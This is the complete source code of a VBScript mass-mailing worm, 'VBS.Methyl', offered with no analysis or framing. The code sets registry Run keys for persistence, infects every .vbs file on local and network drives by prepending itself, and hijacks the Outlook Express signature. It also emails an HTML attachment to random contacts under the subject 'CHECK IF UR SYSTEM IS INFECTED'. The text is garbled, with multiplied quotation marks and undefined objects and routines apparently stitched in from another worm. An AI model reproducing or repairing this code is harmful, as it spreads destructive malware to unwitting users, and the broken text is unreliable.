"'VBS.Methyl.A
'Written by A.v_Killer(PakBrain)
On Error Resume Next
Set sf=CreateObject(""""""""Scripting.FileSystemObject"""""""")
Set ws=CreateObject(""""""""WScript.Shell"""""""")
Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
Set win=sf.GetSpecialFolder(0)
Set sys=sf.GetSpecialFolder(1)

Set cpy=sf.GetFile(WScript.ScriptFullName)
cpy.Copy(win&""""""""\Methyl.vbs"""""""")
r=(""""""""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire"""""""")
ws.RegWrite r,(win&""""""""\Methyl.vbs"""""""")

If cpy <> (win&""""""""\Methyl.vbs"""""""") Then
MsgBox cpy&"""""""" is not a VBS file valid."""""""",vbcritical,cpy
else
CheckEnvi()
SpawnHtml()
OESpread()
Drives()
Spread()
If Day(Now)=1 Then
MsgBox """"""""Methyl""""""""+VbCrLf+""""""""Methyl"""""""",vbinformation,""""""""VBS.Methyl coded by A.v_killer (c)2002""""""""
End If
bureau=ws.SpecialFolders(""""""""Desktop"""""""")
Set link=ws.CreateShortCut(bureau&""""""""\Site_Web.url"""""""")
link.TargetPath=""""""""http://vx.netlux.org/~pakbrain
link.Save
End If
Sub CheckEnvi()
On Error Resume Next
If Not fso.FileExists(htmlloc) And Not vbsdir = startup Then
End If
If fso.FileExists(startup & """"""""\GM1.HTA"""""""") Then fso.DeleteFile(startup & """"""""\GM1.HTA"""""""")
If fso.FileExists(startup & """"""""\GM2.HTA"""""""") Then fso.DeleteFile(startup & """"""""\GM2.HTA"""""""")
If Not fso.FileExists(locdir1 & """"""""\"""""""" & vbsname) Then
	fso.CopyFile vbsloc, locdir1 & """"""""\"""""""" & vbsname
	wsh.Run locdir1 & """"""""\"""""""" & vbsname, False
End If
If Not fso.FileExists(locdir2 & """"""""\"""""""" & vbsname) Then
	fso.CopyFile vbsloc, locdir2 & """"""""\"""""""" & vbsname
	wsh.Run locdir2 & """"""""\"""""""" & vbsname, False
End If
If Not fso.FileExists(locdir3 & """"""""\"""""""" & vbsname) Then
	fso.CopyFile vbsloc, locdir3 & """"""""\"""""""" & vbsname
	wsh.Run locdir3 & """"""""\"""""""" & vbsname, False
End If
If wsh.RegRead(""""""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM1"""""""") = """""""""""""""" Then
	wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM1"""""""", locdir1 & """"""""\"""""""" & vbsname, """"""""REG_SZ""""""""
End If
If wsh.RegRead(""""""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM2"""""""") = """""""""""""""" Then
	wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM2"""""""", locdir2 & """"""""\"""""""" & vbsname, """"""""REG_SZ""""""""
End If
If wsh.RegRead(""""""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM3"""""""") = """""""""""""""" Then
	wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM3"""""""", locdir3 & """"""""\"""""""" & vbsname, """"""""REG_SZ""""""""
End If
End Sub

Sub SpawnHtml()
Dim spwn(4), spwnHtml, spwnTmp
spwn(0) = """"""""<HTML><HEAD><TITLE>Godmessage IV</TITLE>"""""""" 
spwn(1) = """"""""<META content=""""""""""""""""text/html; charset=windows-1252"""""""""""""""" http-equiv=Content-Type></HEAD>"""""""" 
spwn(2) = """"""""<BODY BGColor=""""""""""""""""black"""""""""""""""">"""""""" 
spwn(3) = """"""""<BR><CENTER><H1><FONT color=red>Vbs.Methyl coded by A.v_Killer</FONT></H1></CENTER>""""""""
spwn(4) = """"""""</BODY></HTML>""""""""
Set spwnHtml = fso.CreateTextFile(htmlloc, True)
spwnHtml.Write Join(spwn, vbNewLine)
spwnHtml.close
spwnTmp = Inject(htmlloc)
Set spwnHtml = fso.OpenTextFile(htmlloc, ForWriting, True)
spwnHtml.Write spwnTmp
spwnHtml.close
End Sub

Sub OESpread()
Dim dir1, f1, sf1, f, idn
If sysOS = """"""""Windows_NT"""""""" Then
	dir1 = locdir3 & """"""""\Application Data\Identities""""""""
Else
	dir1 = windir & """"""""\Application Data\Identities""""""""
End If

Set f1 = fso.GetFolder(dir1)
Set sf1 = f1.SubFolders
For Each f in sf1
	idn = f.name
Next
Dim regKey
regKey = """"""""HKCU\Identities\"""""""" & idn & """"""""\Software\Microsoft\Outlook Express\5.0\""""""""
wsh.RegWrite regKey & """"""""Signature Flags"""""""", 00000003, """"""""REG_DWORD""""""""
wsh.RegWrite regKey & """"""""\signatures\Default Signature"""""""", """"""""00000000"""""""", """"""""REG_SZ""""""""
wsh.RegWrite regKey & """"""""\signatures\00000000\file"""""""", htmlloc, """"""""REG_SZ""""""""
wsh.RegWrite regKey & """"""""\signatures\00000000\name"""""""", """"""""Signature #1"""""""", """"""""REG_SZ""""""""
wsh.RegWrite regKey & """"""""\signatures\00000000\text"""""""", """""""""""""""", """"""""REG_SZ""""""""
wsh.RegWrite regKey & """"""""\signatures\00000000\type"""""""", 00000002, """"""""REG_DWORD""""""""
End Sub

Sub Drives
If not sf.FileExists (sys&""""""""\Methyl.txt"""""""") Then
Set DF=sf.CreateTextFile(sys&""""""""\Methyl.txt"""""""")
DF.WriteLine """"""""Infected file by VBS.Methyl""""""""
DF.WriteLine """"""""Methyl""""""""
DF.WriteBlankLines(1)
DF.Close
End If
Set dr=sf.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&""""""""\"""""""")
End If
Next
End Sub
Sub infection(dossier)
Set f=sf.GetFolder(dossier)
Set fc=f.Files
For Each F in fc
ext=sf.GetExtensionName(F.path)
ext=lcase(ext)
If (ext=""""""""vbs"""""""") Then
Set verif=sf.OpenTextFile(F.path, 1, False)
If verif.ReadLine <> """"""""'VBS.Methyl"""""""" Then
tout=verif.ReadAll()
verif.Close
Set inf=sf.OpenTextFile(F.path, 2, True)
inf.Write(virus)
inf.Write(tout)
inf.Close
Set DF=sf.OpenTextFile(sys&""""""""\Methyl.txt"""""""", 8, True)
DF.WriteLine F.path
DF.Close
End If
End If
Next
End Sub
Sub liste(dossier)
Set f=sf.GetFolder(dossier)
Set sd=f.SubFolders
For Each F in sd
infection(F.path)
liste(F.path)
Next
End Sub

Sub Spread()
On Error Resume Next
Dim x, i, n, alst, mail, ctrlists, ctrentries, mailadr, regalst, regadr
Dim outlook, mapi
Set outlook=WScript.CreateObject(""""""""Outlook.Application"""""""")
Set mapi=outlook.GetNameSpace(""""""""MAPI"""""""")
Randomize
For ctrlists=1 to mapi.AddressLists.Count
	set alst = mapi.AddressLists(ctrlists)
	regalst = wsh.RegRead(""""""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""""""" & alst)
	If (regalst="""""""""""""""") then
		regalst=1
		n = 0
	Else
		n = regalst 
	End If
	x = Int(alst.AddressEntries.Count*Rnd+1)
	i = Int(5*Rnd+1)
	If (int(alst.AddressEntries.Count)>int(regalst)) Then
		For ctrentries=1 to i
			mailadr=alst.AddressEntries(x)
			regadr=wsh.RegRead(""""""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""""""" & mailadr)
			If (regadr="""""""""""""""") Then
				n = n + 1
				Set mail=outlook.CreateItem(0)
				mail.Recipients.Add(mailadr)
				mail.Subject = """"""""CHECK IF UR SYSTEM IS INFECTED""""""""
				mail.Body = vbNewline & """"""""Please see attached.""""""""
				mail.Attachments.Add(htmlloc)
				mail.Send
				wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""""""" & mailadr,1,""""""""REG_DWORD""""""""
			End if
			x = Int(alst.AddressEntries.Count*Rnd+1)
		Next
		wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""""""" & alst, n
	Else
		wsh.RegWrite """"""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""""""" & alst, n
	End if
Next
End Sub
"
